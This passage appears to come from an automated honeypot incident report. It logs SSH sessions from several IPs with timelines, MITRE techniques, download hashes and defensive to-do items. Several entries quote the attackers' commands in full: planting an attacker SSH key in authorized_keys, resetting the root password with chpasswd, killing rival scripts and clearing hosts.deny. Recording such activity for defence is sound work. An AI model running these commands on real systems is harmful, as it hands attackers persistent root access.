| `2026-06-14 18:03:53` | `cowrie.session.params` |
| `2026-06-14 18:03:53` | `cowrie.command.input` |
| `2026-06-14 18:03:53` | `cowrie.log.closed` |
| `2026-06-14 18:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320b86340d68

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:05 |
| **Last Seen** | 2026-06-14 18:05 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:05:37` | `cowrie.session.connect` |
| `2026-06-14 18:05:37` | `cowrie.client.version` |
| `2026-06-14 18:05:37` | `cowrie.client.kex` |
| `2026-06-14 18:05:40` | `cowrie.login.success` |
| `2026-06-14 18:05:40` | `cowrie.session.params` |
| `2026-06-14 18:05:40` | `cowrie.command.input` |
| `2026-06-14 18:05:40` | `cowrie.command.failed` |
| `2026-06-14 18:05:42` | `cowrie.log.closed` |
| `2026-06-14 18:05:43` | `cowrie.session.params` |
| `2026-06-14 18:05:43` | `cowrie.command.input` |
| `2026-06-14 18:05:43` | `cowrie.session.file_download` |
| `2026-06-14 18:05:43` | `cowrie.log.closed` |
| `2026-06-14 18:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc3be674a0e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:05 |
| **Last Seen** | 2026-06-14 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:05:52` | `cowrie.session.connect` |
| `2026-06-14 18:05:52` | `cowrie.client.version` |
| `2026-06-14 18:05:52` | `cowrie.client.kex` |
| `2026-06-14 18:05:53` | `cowrie.login.success` |
| `2026-06-14 18:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94dd5bac3112

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:24 |
| **Last Seen** | 2026-06-14 18:25 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:X1zZeyiUzH8O"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:24:20` | `cowrie.session.connect` |
| `2026-06-14 18:24:20` | `cowrie.client.version` |
| `2026-06-14 18:24:21` | `cowrie.client.kex` |
| `2026-06-14 18:24:23` | `cowrie.login.success` |
| `2026-06-14 18:24:24` | `cowrie.session.params` |
| `2026-06-14 18:24:24` | `cowrie.command.input` |
| `2026-06-14 18:24:24` | `cowrie.command.failed` |
| `2026-06-14 18:24:24` | `cowrie.log.closed` |
| `2026-06-14 18:24:25` | `cowrie.session.params` |
| `2026-06-14 18:24:25` | `cowrie.command.input` |
| `2026-06-14 18:24:25` | `cowrie.session.file_download` |
| `2026-06-14 18:24:25` | `cowrie.log.closed` |
| `2026-06-14 18:24:42` | `cowrie.session.params` |
| `2026-06-14 18:24:42` | `cowrie.command.input` |
| `2026-06-14 18:24:42` | `cowrie.log.closed` |
| `2026-06-14 18:24:42` | `cowrie.session.params` |
| `2026-06-14 18:24:42` | `cowrie.command.input` |
| `2026-06-14 18:24:43` | `cowrie.log.closed` |
| `2026-06-14 18:24:43` | `cowrie.session.params` |
| `2026-06-14 18:24:43` | `cowrie.command.input` |
| `2026-06-14 18:24:44` | `cowrie.session.file_download` |
| `2026-06-14 18:24:44` | `cowrie.log.closed` |
| `2026-06-14 18:24:44` | `cowrie.session.params` |
| `2026-06-14 18:24:44` | `cowrie.command.input` |
| `2026-06-14 18:24:45` | `cowrie.log.closed` |
| `2026-06-14 18:24:46` | `cowrie.session.params` |
| `2026-06-14 18:24:46` | `cowrie.command.input` |
| `2026-06-14 18:24:48` | `cowrie.log.closed` |
| `2026-06-14 18:24:48` | `cowrie.session.params` |
| `2026-06-14 18:24:48` | `cowrie.command.input` |
| `2026-06-14 18:24:48` | `cowrie.command.input` |
| `2026-06-14 18:24:49` | `cowrie.log.closed` |
| `2026-06-14 18:24:49` | `cowrie.session.params` |
| `2026-06-14 18:24:49` | `cowrie.command.input` |
| `2026-06-14 18:24:50` | `cowrie.log.closed` |
| `2026-06-14 18:24:51` | `cowrie.session.params` |
| `2026-06-14 18:24:51` | `cowrie.command.input` |
| `2026-06-14 18:24:52` | `cowrie.log.closed` |
| `2026-06-14 18:24:53` | `cowrie.session.params` |
| `2026-06-14 18:24:53` | `cowrie.command.input` |
| `2026-06-14 18:24:54` | `cowrie.log.closed` |
| `2026-06-14 18:24:55` | `cowrie.session.params` |
| `2026-06-14 18:24:55` | `cowrie.command.input` |
| `2026-06-14 18:24:55` | `cowrie.log.closed` |
| `2026-06-14 18:24:57` | `cowrie.session.params` |
| `2026-06-14 18:24:57` | `cowrie.command.input` |
| `2026-06-14 18:25:00` | `cowrie.log.closed` |
| `2026-06-14 18:25:00` | `cowrie.session.params` |
| `2026-06-14 18:25:00` | `cowrie.command.input` |
| `2026-06-14 18:25:01` | `cowrie.log.closed` |
| `2026-06-14 18:25:01` | `cowrie.session.params` |
| `2026-06-14 18:25:01` | `cowrie.command.input` |
| `2026-06-14 18:25:02` | `cowrie.log.closed` |
| `2026-06-14 18:25:02` | `cowrie.session.params` |
| `2026-06-14 18:25:02` | `cowrie.command.input` |
| `2026-06-14 18:25:03` | `cowrie.log.closed` |
| `2026-06-14 18:25:03` | `cowrie.session.params` |
| `2026-06-14 18:25:03` | `cowrie.command.input` |
| `2026-06-14 18:25:04` | `cowrie.log.closed` |
| `2026-06-14 18:25:04` | `cowrie.session.params` |
| `2026-06-14 18:25:04` | `cowrie.command.input` |
| `2026-06-14 18:25:05` | `cowrie.log.closed` |
| `2026-06-14 18:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5413e1c4f93c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:37 |
| **Last Seen** | 2026-06-14 18:37 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ysl8Y0xH9bmY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:37:16` | `cowrie.session.connect` |
| `2026-06-14 18:37:16` | `cowrie.client.version` |
| `2026-06-14 18:37:17` | `cowrie.client.kex` |
| `2026-06-14 18:37:18` | `cowrie.login.success` |
| `2026-06-14 18:37:18` | `cowrie.session.params` |
| `2026-06-14 18:37:18` | `cowrie.command.input` |
| `2026-06-14 18:37:18` | `cowrie.command.failed` |
| `2026-06-14 18:37:20` | `cowrie.log.closed` |
| `2026-06-14 18:37:21` | `cowrie.session.params` |
| `2026-06-14 18:37:21` | `cowrie.command.input` |
| `2026-06-14 18:37:22` | `cowrie.session.file_download` |
| `2026-06-14 18:37:22` | `cowrie.log.closed` |
| `2026-06-14 18:37:39` | `cowrie.session.params` |
| `2026-06-14 18:37:39` | `cowrie.command.input` |
| `2026-06-14 18:37:39` | `cowrie.log.closed` |
| `2026-06-14 18:37:40` | `cowrie.session.params` |
| `2026-06-14 18:37:40` | `cowrie.command.input` |
| `2026-06-14 18:37:40` | `cowrie.log.closed` |
| `2026-06-14 18:37:40` | `cowrie.session.params` |
| `2026-06-14 18:37:40` | `cowrie.command.input` |
| `2026-06-14 18:37:40` | `cowrie.session.file_download` |
| `2026-06-14 18:37:40` | `cowrie.log.closed` |
| `2026-06-14 18:37:41` | `cowrie.session.params` |
| `2026-06-14 18:37:41` | `cowrie.command.input` |
| `2026-06-14 18:37:43` | `cowrie.log.closed` |
| `2026-06-14 18:37:43` | `cowrie.session.params` |
| `2026-06-14 18:37:43` | `cowrie.command.input` |
| `2026-06-14 18:37:45` | `cowrie.log.closed` |
| `2026-06-14 18:37:45` | `cowrie.session.params` |
| `2026-06-14 18:37:45` | `cowrie.command.input` |
| `2026-06-14 18:37:45` | `cowrie.command.input` |
| `2026-06-14 18:37:45` | `cowrie.log.closed` |
| `2026-06-14 18:37:46` | `cowrie.session.params` |
| `2026-06-14 18:37:46` | `cowrie.command.input` |
| `2026-06-14 18:37:47` | `cowrie.log.closed` |
| `2026-06-14 18:37:47` | `cowrie.session.params` |
| `2026-06-14 18:37:47` | `cowrie.command.input` |
| `2026-06-14 18:37:48` | `cowrie.log.closed` |
| `2026-06-14 18:37:49` | `cowrie.session.params` |
| `2026-06-14 18:37:49` | `cowrie.command.input` |
| `2026-06-14 18:37:49` | `cowrie.log.closed` |
| `2026-06-14 18:37:50` | `cowrie.session.params` |
| `2026-06-14 18:37:50` | `cowrie.command.input` |
| `2026-06-14 18:37:50` | `cowrie.log.closed` |
| `2026-06-14 18:37:50` | `cowrie.session.params` |
| `2026-06-14 18:37:50` | `cowrie.command.input` |
| `2026-06-14 18:37:52` | `cowrie.log.closed` |
| `2026-06-14 18:37:53` | `cowrie.session.params` |
| `2026-06-14 18:37:53` | `cowrie.command.input` |
| `2026-06-14 18:37:54` | `cowrie.log.closed` |
| `2026-06-14 18:37:54` | `cowrie.session.params` |
| `2026-06-14 18:37:54` | `cowrie.command.input` |
| `2026-06-14 18:37:55` | `cowrie.log.closed` |
| `2026-06-14 18:37:55` | `cowrie.session.params` |
| `2026-06-14 18:37:55` | `cowrie.command.input` |
| `2026-06-14 18:37:56` | `cowrie.log.closed` |
| `2026-06-14 18:37:57` | `cowrie.session.params` |
| `2026-06-14 18:37:57` | `cowrie.command.input` |
| `2026-06-14 18:37:58` | `cowrie.log.closed` |
| `2026-06-14 18:37:59` | `cowrie.session.params` |
| `2026-06-14 18:37:59` | `cowrie.command.input` |
| `2026-06-14 18:37:59` | `cowrie.log.closed` |
| `2026-06-14 18:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ca39f68785

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:45 |
| **Last Seen** | 2026-06-14 18:45 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:VEQaxsM6z74c"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:45:10` | `cowrie.session.connect` |
| `2026-06-14 18:45:10` | `cowrie.client.version` |
| `2026-06-14 18:45:11` | `cowrie.client.kex` |
| `2026-06-14 18:45:12` | `cowrie.login.success` |
| `2026-06-14 18:45:13` | `cowrie.session.params` |
| `2026-06-14 18:45:13` | `cowrie.command.input` |
| `2026-06-14 18:45:13` | `cowrie.command.failed` |
| `2026-06-14 18:45:17` | `cowrie.log.closed` |
| `2026-06-14 18:45:17` | `cowrie.session.params` |
| `2026-06-14 18:45:17` | `cowrie.command.input` |
| `2026-06-14 18:45:18` | `cowrie.session.file_download` |
| `2026-06-14 18:45:18` | `cowrie.log.closed` |
| `2026-06-14 18:45:29` | `cowrie.session.params` |
| `2026-06-14 18:45:29` | `cowrie.command.input` |
| `2026-06-14 18:45:30` | `cowrie.log.closed` |
| `2026-06-14 18:45:30` | `cowrie.session.params` |
| `2026-06-14 18:45:30` | `cowrie.command.input` |
| `2026-06-14 18:45:33` | `cowrie.log.closed` |
| `2026-06-14 18:45:33` | `cowrie.session.params` |
| `2026-06-14 18:45:33` | `cowrie.command.input` |
| `2026-06-14 18:45:33` | `cowrie.session.file_download` |
| `2026-06-14 18:45:33` | `cowrie.log.closed` |
| `2026-06-14 18:45:34` | `cowrie.session.params` |
| `2026-06-14 18:45:34` | `cowrie.command.input` |
| `2026-06-14 18:45:36` | `cowrie.log.closed` |
| `2026-06-14 18:45:36` | `cowrie.session.params` |
| `2026-06-14 18:45:36` | `cowrie.command.input` |
| `2026-06-14 18:45:38` | `cowrie.log.closed` |
| `2026-06-14 18:45:39` | `cowrie.session.params` |
| `2026-06-14 18:45:39` | `cowrie.command.input` |
| `2026-06-14 18:45:39` | `cowrie.command.input` |
| `2026-06-14 18:45:41` | `cowrie.log.closed` |
| `2026-06-14 18:45:41` | `cowrie.session.params` |
| `2026-06-14 18:45:41` | `cowrie.command.input` |
| `2026-06-14 18:45:44` | `cowrie.log.closed` |
| `2026-06-14 18:45:45` | `cowrie.session.params` |
| `2026-06-14 18:45:45` | `cowrie.command.input` |
| `2026-06-14 18:45:46` | `cowrie.log.closed` |
| `2026-06-14 18:45:46` | `cowrie.session.params` |
| `2026-06-14 18:45:46` | `cowrie.command.input` |
| `2026-06-14 18:45:47` | `cowrie.log.closed` |
| `2026-06-14 18:45:47` | `cowrie.session.params` |
| `2026-06-14 18:45:47` | `cowrie.command.input` |
| `2026-06-14 18:45:49` | `cowrie.log.closed` |
| `2026-06-14 18:45:50` | `cowrie.session.params` |
| `2026-06-14 18:45:50` | `cowrie.command.input` |
| `2026-06-14 18:45:52` | `cowrie.log.closed` |
| `2026-06-14 18:45:53` | `cowrie.session.params` |
| `2026-06-14 18:45:53` | `cowrie.command.input` |
| `2026-06-14 18:45:53` | `cowrie.log.closed` |
| `2026-06-14 18:45:55` | `cowrie.session.params` |
| `2026-06-14 18:45:55` | `cowrie.command.input` |
| `2026-06-14 18:45:56` | `cowrie.log.closed` |
| `2026-06-14 18:45:56` | `cowrie.session.params` |
| `2026-06-14 18:45:56` | `cowrie.command.input` |
| `2026-06-14 18:45:58` | `cowrie.log.closed` |
| `2026-06-14 18:45:58` | `cowrie.session.params` |
| `2026-06-14 18:45:58` | `cowrie.command.input` |
| `2026-06-14 18:45:59` | `cowrie.log.closed` |
| `2026-06-14 18:45:59` | `cowrie.session.params` |
| `2026-06-14 18:45:59` | `cowrie.command.input` |
| `2026-06-14 18:45:59` | `cowrie.log.closed` |
| `2026-06-14 18:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.135[.]189` to AbuseIPDB if not already reported
- [ ] Block `120.48.135[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cccfc553d8

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-06-14 19:19 |
| **Last Seen** | 2026-06-14 19:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 19:19:15` | `cowrie.session.connect` |
| `2026-06-14 19:19:15` | `cowrie.client.version` |
| `2026-06-14 19:19:15` | `cowrie.client.kex` |
| `2026-06-14 19:19:16` | `cowrie.login.success` |
| `2026-06-14 19:19:16` | `cowrie.session.params` |
| `2026-06-14 19:19:16` | `cowrie.command.input` |
| `2026-06-14 19:19:16` | `cowrie.command.failed` |
| `2026-06-14 19:19:16` | `cowrie.log.closed` |
| `2026-06-14 19:19:16` | `cowrie.session.params` |
| `2026-06-14 19:19:16` | `cowrie.command.input` |
| `2026-06-14 19:19:17` | `cowrie.session.file_download` |
| `2026-06-14 19:19:17` | `cowrie.log.closed` |
| `2026-06-14 19:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535a0e1d69c5

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-06-14 19:19 |
| **Last Seen** | 2026-06-14 19:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 19:19:19` | `cowrie.session.connect` |
| `2026-06-14 19:19:19` | `cowrie.client.version` |
| `2026-06-14 19:19:19` | `cowrie.client.kex` |
| `2026-06-14 19:19:20` | `cowrie.login.success` |
| `2026-06-14 19:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-662e9b1f83dc

| Field | Detail |
|---|---|
| **Source IP** | `71.71.250[.]77` |
| **First Seen** | 2026-06-14 19:22 |
| **Last Seen** | 2026-06-14 19:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 19:22:20` | `cowrie.session.connect` |
| `2026-06-14 19:22:20` | `cowrie.client.version` |
| `2026-06-14 19:22:20` | `cowrie.client.kex` |
| `2026-06-14 19:22:21` | `cowrie.login.success` |
| `2026-06-14 19:22:22` | `cowrie.session.params` |
| `2026-06-14 19:22:22` | `cowrie.command.input` |
| `2026-06-14 19:22:22` | `cowrie.command.failed` |
| `2026-06-14 19:22:22` | `cowrie.log.closed` |
| `2026-06-14 19:22:23` | `cowrie.session.params` |
| `2026-06-14 19:22:23` | `cowrie.command.input` |
| `2026-06-14 19:22:23` | `cowrie.session.file_download` |
| `2026-06-14 19:22:23` | `cowrie.log.closed` |
| `2026-06-14 19:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.71.250[.]77` to AbuseIPDB if not already reported
- [ ] Block `71.71.250[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d260fb859083

| Field | Detail |
|---|---|
| **Source IP** | `71.71.250[.]77` |
| **First Seen** | 2026-06-14 19:22 |
| **Last Seen** | 2026-06-14 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 19:22:26` | `cowrie.session.connect` |
| `2026-06-14 19:22:26` | `cowrie.client.version` |
| `2026-06-14 19:22:26` | `cowrie.client.kex` |
| `2026-06-14 19:22:27` | `cowrie.login.success` |
| `2026-06-14 19:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.71.250[.]77` to AbuseIPDB if not already reported
- [ ] Block `71.71.250[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.135[.]189` | **35** | 2026-06-14 17:22 | 2026-06-14 18:47 | 60m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.130.90[.]166` | **31** | 2026-06-14 17:27 | 2026-06-14 17:55 | 1m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.41[.]79` | **25** | 2026-06-14 19:25 | 2026-06-14 19:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `64.188.77[.]26` | **18** | 2026-06-14 17:23 | 2026-06-14 17:52 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
